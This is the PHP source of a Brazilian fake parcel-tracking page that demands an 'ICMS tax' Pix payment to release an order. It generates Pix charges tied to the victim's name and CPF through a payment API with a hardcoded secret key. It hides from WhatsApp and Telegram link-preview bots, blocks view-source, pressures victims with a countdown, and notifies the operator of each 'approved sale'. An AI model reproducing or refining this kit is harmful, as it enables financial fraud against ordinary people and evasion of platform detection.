<?php
ob_start(); // Garante que não há saída antes dos cookies serem enviados
session_start();

// Identificador único para a primeira página
$paginaId = 'pagina2'; // Altere para 'pagina2' na segunda página

// Verifica se a requisição é de um bot (como o WhatsApp) ou de um usuário real
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isBot = preg_match('/bot|crawl|slurp|spider|facebook|whatsapp|telegram|twitter/i', $userAgent);

// Se for um bot, não gera o Pix
if ($isBot) {
    die("Prévia de link detectada. O Pix não será gerado.");
}

// Verifica se os parâmetros necessários foram recebidos via GET
if (!isset($_GET['nome']) || !isset($_GET['cpf'])) {
    die("Erro: Parâmetros incompletos.");
}

// Captura e formata os dados corretamente
$nome = filter_input(INPUT_GET, 'nome', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$cpf = filter_input(INPUT_GET, 'cpf', FILTER_SANITIZE_FULL_SPECIAL_CHARS);

// Remove espaços extras
$nome = trim($nome);
$cpf = trim($cpf);

// Normaliza o CPF removendo pontos e traços
$cpf = preg_replace('/\D/', '', $cpf);
if (strlen($cpf) !== 11) {
    die("Erro: CPF inválido.");
}

// Inicializa a variável para armazenar os dados do PIX
$pix_data = [];

// Verifica se já existe um PIX salvo no cookie para esta página
if (isset($_COOKIE['pix_data_' . $paginaId])) {
    $pix_data = json_decode($_COOKIE['pix_data_' . $paginaId], true);
    if (!empty($pix_data['pix'])) {
        // Define $pixCode com base no valor do cookie
        $pixCode = $pix_data['pix'];
        $pixQrCode = $pixCode;

        // Salva os dados completos no sessionStorage para o uso imediato na sessão
        echo "<script>sessionStorage.setItem('pixData', '" . json_encode($pix_data) . "');</script>";
    }
} else {
    // Se não há PIX salvo, gerar um novo

    // Dados para a API do Código 2
    $url = "https://pay.ograpefy.com/api/v1/transaction.purchase";
    $headers = [
        "Content-Type: application/json",
        "Authorization: 9db15b88-9cb1-4433-870c-f411837315a5" // Substitua pela sua secretKey
    ];

    $data = [
        "name" => $nome,
        "email" => "exemplo@email.com", // Defina manualmente ou adicione um campo no formulário
        "cpf" => $cpf,
        "phone" => "16977777777", // Defina manualmente ou adicione um campo no formulário
        "paymentMethod" => "PIX",
        "amount" => 2937, // R$9,39 em centavos
        "traceable" => true,
        "utmQuery" => "ZXUP1",
        "items" => [
            [
                "unitPrice" => 2937, // Preço unitário em centavos
                "title" => "UP1",
                "quantity" => 1,
                "tangible" => false
            ]
        ]
    ];

    // Inicializa o cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    // Executa a requisição
    $response = curl_exec($ch);
    curl_close($ch);

    // Decodifica a resposta JSON
    $response_data = json_decode($response, true);

    // Verifica se a transação foi criada com sucesso
    if (isset($response_data['id'])) {
        $transactionId = $response_data['id']; // ID da transação
        $pixCode = $response_data['pixCode']; // Código PIX
        $status = $response_data['status']; // Status da transação

        // Salva os dados no cookie (válido por 1 hora)
        setcookie("pix_data_" . $paginaId, json_encode([
            "pix" => $pixCode,
            "externalId" => $transactionId,
            "status" => $status
        ]), time() + 3600, "/");

        // Salva os dados no sessionStorage
        echo "<script>
            sessionStorage.setItem('pixData', '" . json_encode([
                "pix" => $pixCode,
                "externalId" => $transactionId,
                "status" => $status
            ]) . "');
            sessionStorage.setItem('externalId', '$transactionId');
            sessionStorage.setItem('pixCode', '$pixCode');
            sessionStorage.setItem('status', '$status');
        </script>";

        $pixQrCode = $pixCode;
    } else {
        die("Erro ao gerar PIX: " . print_r($response_data, true));
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rastreio de Encomendas</title>
    <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="js/jquery.min.js"></script>
    <style>
        #exibeqr {
            display: none;
            margin-top: 24px;
            margin-bottom: 24px;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        #qrcode {
            display: flex;
            justify-content: left; /* Alinha mais à esquerda */
            align-items: center;
            background: white;
            padding: 8px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            max-width: 140px; /* Reduzindo o tamanho do QR Code */
            margin-left: -27px; /* Diminua para mover mais à esquerda */
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }

        #qrcode img {
            max-width: 140px; /* Diminuindo o tamanho */
            height: auto;
        }
    </style>
    <style>
        :root {
            --primary-color: #000;
            --secondary-color: #00AECB;
            --accent-color: #00AECB;
            --primary-light: #ffffff;
        }
        .header {
            background: #f3f3f3;
            padding: 15px 0;
            text-align: center;
            border-bottom: 3px solid var(--primary-light);
        }
        .main-content {
            max-width: 450px;
            background-color: white;
            text-align: center;
            padding: 2rem 2rem 1rem 2rem;
            border-radius: 10px;
            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
            margin: 0 auto;
        }
        .main-content h2 {
            margin-bottom: 20px;
        }
        .btn-custom {
            color: white;
            border: none;
            width: 100%;
            margin-bottom: 10px;
            background: black;
            font-weight: 600;
            border-radius: 1rem;
            padding: .75rem 3rem;
            letter-spacing: .3px;
            line-height: 1.15;
        }
        .btn-custom:hover {
            color: white !important;
            background-color: green !important;
            transform: scale(1.02) !important;
        }
        .footer {
            background-color: #black;
            border-top: solid 1px #e6dddd;
            color: #000;
            text-align: center;
            width: 100%;
            bottom: 0;
            grid-area: footer;
            border-bottom: solid 3px black;
            padding: 2rem 0.5rem;
            position: relative;
            margin-top: 50px;
        }
        #conclusao {
            display: none;
        }
        #conclusao h4 {
            color: green;
            font-weight: bold;
        }
        .char {
            border-top: solid 2px #00adca;
            background-color: #00adca;
            padding: 2px !important;
        }
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        input, textarea {
            -webkit-touch-callout: initial;
            -webkit-user-select: text;
            -khtml-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }
    </style>
    <script>
        if (document.addEventListener) {
            document.addEventListener("keydown", bloquearSource);
            document.addEventListener("contextmenu", function(e) {
                e.preventDefault();
                return false;
            });
        } else {
            document.attachEvent("onkeydown", bloquearSource);
            document.attachEvent("oncontextmenu", function(e) {
                e = e || window.event;
                e.returnValue = false;
                return false;
            });
        }
        function bloquearSource(e) {
            e = e || window.event;
            var code = e.which || e.keyCode;
            if (e.ctrlKey && (code == 83 || code == 85)) {
                if (e.preventDefault) {
                    e.preventDefault();
                } else {
                    e.returnValue = false;
                }
                return false;
            }
        }
    </script>
</head>
<body>
<div style="display: grid; grid-template-areas: 'top-bar' 'content' 'footer'; grid-template-rows: auto 1fr auto; min-height: 100vh;">
    <div class="header">
        <img decoding="async" style="width: 400px;" src="/images/topo2.png" alt="Imagem Centralizada">
    </div>
    <div style="grid-area: content; padding: 0 1rem;">
                    <div style="width: 100vw; background-color: #FA8E29; color: white; text-align: center; padding: 10px; margin-left: -1rem; margin-right: -1rem; font-size: 0.9rem;">
                REGULARIZE O (ICMS) IMPOSTO ESTADUAL, PARA LIBERAÇÃO DO SEU PEDIDO!
            </div>
        <div style="margin-top: 10px;" class="main-content">
            <div id="formulario" class="mb-3">
                <!-- Seção de Produto -->
                <div class="produto-info mb-4 d-flex" style="align-items: center;">
                    <!-- Imagem do Produto -->
                    <div class="produto-imagem" style="margin-right: 10px;">
                        <img src="/rastreio/images/icone.jpg" alt="Imagem do Produto" style="width: 56px; height: 56px; object-fit: cover; border-radius: 8px;">
                    </div>
                    <!-- Nome e Descrição do Produto -->
                    <div class="produto-detalhes">
                        <h4 class="produto-nome" style="margin-bottom: 5px; font-size: 1.10rem; line-height: 1.2;">Taxa de ICMS</h4>
                        <p class="produto-descricao" style="font-size: 0.9rem; color: #6c757d; margin-top: 0; margin-left: -52px;">ID: 4127</p>
                    </div>
                </div>
                <div class="compra-status">
                    <div class="app-alerta-msg mb-2">
                        <i class="app-alerta-msg--icone bi bi-check-circle text-warning"></i>
                        <div class="app-alerta-msg--txt">
                            <h3 class="app-alerta-msg--titulo">Aguardando Pagamento!</h3>
                            <p>Finalize o pagamento</p>
                        </div>
                    </div>
                    <hr class="my-2">
                </div>
                <div class="compra-pagamento">
                    <div class="pagamentoQrCode text-center">
                        <div class="pagamento-rapido">
                            <div class="app-card card rounded-top rounded-0 shadow-none border-bottom">
                                <div class="card-body">
                                    <div class="pagamento-rapido--progress">
                                        <div class="d-flex justify-content-center align-items-center mb-1 font-md">
                                            <div><small>Você tem</small></div>
                                            <div class="mx-1"><b class="font-md" id="tempo-restante">05:00</b></div>
                                            <div><small>para pagar</small></div>
                                        </div>
                                        <div class="progress bg-dark bg-opacity-50">
                                            <div class="progress-bar bg-danger" role="progressbar" aria-valuenow="14.777777777777779" aria-valuemin="0" aria-valuemax="100" id="barra-progresso" style="width: 14.7778%;"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="app-card card rounded-bottom rounded-0 rounded-bottom b-1 border-dark mb-2">
                            <div class="card-body">
                                <div class="row justify-content-center mb-2">
                                    <div class="col-12 text-start">
                                        <div class="mb-1"><span class="font-xs">Valor: </span><span class="badge bg-success badge-xs">R$29,37</span></div>
                                        <div class="mb-1"><span class="badge bg-success badge-xs">1</span><span class="font-xs"> Copie o código PIX abaixo.</span></div>
                                        <div class="input-group mb-2">
                                            <input id="pixCopiaCola" type="text" class="form-control" value="<?php echo htmlspecialchars($pixCode); ?>" readonly>
                                            <div class="input-group-append">
                                                <button id="btnCopiar" onclick="copyPix()" class="app-btn btn btn-success rounded-0 rounded-end">Copiar</button>
                                            </div>
                                        </div>
                                        <div class="mb-2"><span class="badge bg-success">2</span> <span class="font-xs">Abra o app do seu banco e escolha a opção PIX, como se fosse fazer uma transferência.</span></div>
                                        <p><span class="badge bg-success">3</span> <span class="font-xs">Selecione a opção PIX cópia e cola, cole a chave copiada e confirme o pagamento.</span></p>
                                    </div>
                                    <div class="col-12 my-2">
                                        <p class="alert alert-warning p-2 font-xss" style="text-align: justify; margin-bottom:0.5rem !important">Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado sua solicitação será cancelada.</p>
                                        <p>⚠️ATENÇÃO, após realizar o pagamento volte nesta página para concluir a solicitação.</p>
                                    </div>
                                </div>
                                <button id="btmqr" class="btn-custom" type="button">Mostrar QR Code</button>
                                <div id="exibeqr" style="display: none; margin-top: 24px; margin-bottom: 24px; align-items: center;" class="row justify-content-center">
                                    <div class="col-6 pb-3">
                                        <div style="text-align: left; font-size: 0.9rem !important" class="font-xss">
                                            <h5><i class="bi bi-qr-code"></i> QR Code</h5>
                                            <div>Acesse o APP do seu banco e escolha a opção <strong>pagar com QR Code,</strong> escaneie o código ao lado e confirme o pagamento.</div>
                                        </div>
                                    </div>
                                    <div class="col-6 d-flex justify-content-start">
                                        <div class="d-inline-block bg-white rounded p-2">
                                            <?php if ($pixQrCode === "DEU MERDA"): ?>
                                                <div id="qrcode"><p style="color: red; font-weight: bold;"><?php echo $pixQrCode; ?></p></div>
                                            <?php else: ?>
                                                <div id="qrcode"></div>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function copyPix() {
    var copyText = document.getElementById("pixCopiaCola");
    var button = document.getElementById("btnCopiar");

    // Copia o texto para a área de transferência
    navigator.clipboard.writeText(copyText.value).then(() => {
        // Muda o texto do botão para "Copiado!"
        button.textContent = "Copiado!";
        button.classList.remove("btn-success");
        button.classList.add("btn-secondary"); // Opcional: muda a cor para indicar sucesso

        // Volta ao texto original depois de 2 segundos
        setTimeout(() => {
            button.textContent = "Copiar";
            button.classList.remove("btn-secondary");
            button.classList.add("btn-success");
        }, 2000);
    }).catch(err => {
        console.error("Erro ao copiar: ", err);
    });
}
</script>
<script>
$(document).ready(function() {
    var tempoInicial = 5; // 5 minutos
    var progressoMaximo = 100;
    var tempoRestante2;

    // Verifica se o tempo restante está salvo no localStorage
    if (localStorage.getItem("tempoRestante2")) {
        tempoRestante2 = parseInt(localStorage.getItem("tempoRestante2"));

        // Caso o tempo restante seja maior que o tempo inicial (5 minutos) ou valor inválido, reinicia para 5 minutos
        if (isNaN(tempoRestante2) || tempoRestante2 > tempoInicial * 60) {
            tempoRestante2 = tempoInicial * 60;
            localStorage.setItem("tempoRestante2", tempoRestante2); // Salva o tempo correto
        }
    } else {
        tempoRestante2 = tempoInicial * 60; // 5 minutos em segundos
        localStorage.setItem("tempoRestante2", tempoRestante2); // Salva o tempo correto
    }

    var intervalo = setInterval(function() {
        var minutos = Math.floor(tempoRestante2 / 60);
        var segundos = tempoRestante2 % 60;
        var tempoFormatado = minutos.toString().padStart(2, '0') + ':' + segundos.toString().padStart(2, '0');
        $('#tempo-restante2').text(tempoFormatado);
        var progresso = ((tempoInicial * 60 - tempoRestante2) / (tempoInicial * 60)) * progressoMaximo;
        $('#barra-progresso').css('width', progresso + '%').attr('aria-valuenow', progresso);
        tempoRestante2--;
        localStorage.setItem("tempoRestante2", tempoRestante2); // Atualiza o tempo no localStorage
        if (tempoRestante2 < 0) {
            clearInterval(intervalo);
            localStorage.removeItem("tempoRestante2");
        }
    }, 1000);
});
</script>
<script>
    // ⏳ VERIFICAÇÃO DO STATUS DO PAGAMENTO A CADA 3 SEGUNDOS
    let notificationSent = false; // Evita que a notificação seja enviada mais de uma vez
    setInterval(() => {
    // Recupera os dados do sessionStorage
    const pixData = JSON.parse(sessionStorage.getItem('pixData'));

    // Verifica se os dados necessários estão presentes
    if (!pixData || !pixData.externalId) {
        console.log("❌ Nenhum externalId encontrado no pixData, não será possível verificar o pagamento.");
        return;
    }

    const transactionId = pixData.externalId; // Busca o externalId de dentro do pixData

    // Faz a requisição para verificar o status do pagamento
    fetch(`https://pay.ograpefy.com/api/v1/transaction.getPayment?id=${transactionId}`, {
        headers: {
            "Authorization": "9db15b88-9cb1-4433-870c-f411837315a5" // Substitua pela sua secretKey
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Erro na requisição: ${response.status} ${response.statusText}`);
        }
        return response.json();
    })
    .then(data => {
        console.log("📡 Resposta da API:", data);

        // Verifica se o status é "APPROVED"
        if (data.status === "APPROVED") {
            console.log("✅ Pagamento CONFIRMADO!");

            // Envia a notificação de pagamento confirmado (apenas uma vez)
            if (!notificationSent) {
                fetch("https://api.pushcut.io/wciBAFXDTHO-VzCOtbMzP/notifications/ZXUP1", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        title: "Venda Aprovada!",
                        message: "Seu pagamento via Pix foi processado com sucesso."
                    })
                })
                .then(() => {
                    console.log("📲 Notificação de Pagamento Confirmado enviada!");
                    notificationSent = true; // Marca que a notificação já foi enviada
                })
                .catch(error => console.error("❌ Erro ao enviar notificação de Pagamento Confirmado:", error));
            }

            // Aguarda 2 segundos antes de redirecionar
            setTimeout(() => {
                // Pega os parâmetros cpf e nome da URL atual
                const urlParams = new URLSearchParams(window.location.search);
                const cpf = urlParams.get('cpf');
                const nome = urlParams.get('nome');

                if (cpf && nome) {
                    // Redireciona para a página de conclusão com os parâmetros da URL
                    window.location.href = `/chat?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}`;
                } else {
                    console.error("⚠️ CPF ou Nome não encontrados na URL.");
                }
            }, 2000);
        } else {
            console.log("⏳ Pagamento ainda pendente... Status atual:", data.status);
        }
    })
    .catch(error => {
        console.error("❌ Erro ao verificar pagamento:", error);
    });
}, 2000); // Verifica a cada 3 segundos
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        var botaoQr = document.getElementById("btmqr");
        var exibeQr = document.getElementById("exibeqr");
        var qrcodeDiv = document.getElementById("qrcode");

        botaoQr.addEventListener("click", function() {
            if (exibeQr.style.display === "none" || exibeQr.style.display === "") {
                // Exibe a div do QR Code
                exibeQr.style.display = "flex";

                // Limpa qualquer QR Code anterior
                qrcodeDiv.innerHTML = "";

                // Código Pix vindo do PHP
                var pixCopiaCola = <?php echo json_encode($pixCode); ?>;

                if (pixCopiaCola && pixCopiaCola.trim() !== "") {
                    // Gera o QR Code
                    new QRCode(qrcodeDiv, {
                        text: pixCopiaCola,
                        width: 200,
                        height: 200
                    });
                } else {
                    qrcodeDiv.innerHTML = "<p style='color:red;'>Erro ao gerar QR Code</p>";
                }

                // Altera o texto do botão para "Fechar QR Code"
                botaoQr.innerText = "Fechar QR Code";
            } else {
                // Oculta a div do QR Code
                exibeQr.style.display = "none";

                // Altera o texto do botão para "Mostrar QR Code"
                botaoQr.innerText = "Mostrar QR Code";
            }
        });
    });
</script>
</body>
</html>